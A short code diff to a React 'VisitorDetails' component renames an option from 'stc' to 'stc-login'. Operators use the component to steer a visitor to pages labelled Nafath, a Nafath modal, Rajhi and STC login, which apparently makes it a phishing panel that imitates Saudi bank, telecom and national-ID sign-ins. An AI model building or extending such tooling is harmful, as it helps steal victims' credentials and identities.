@@ -95,7 +95,7 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
             currentStep: "rajhi" as any,
           };
           break;
-           case "stc":
+           case "stc-login":
           updates = {
             redirectPage: "stc-login" as any,
             currentStep: "stc-login" as any,
@@ -760,7 +760,7 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
               <option value="nafad">نفاذ</option>
               <option value="nafad_modal">مودال نفاذ</option>
               <option value="rajhi">راجحي</option>
-              <option value="stc">stc</option>
+              <option value="stc-login">stc</option>
             </select>
           </div>
         </div>
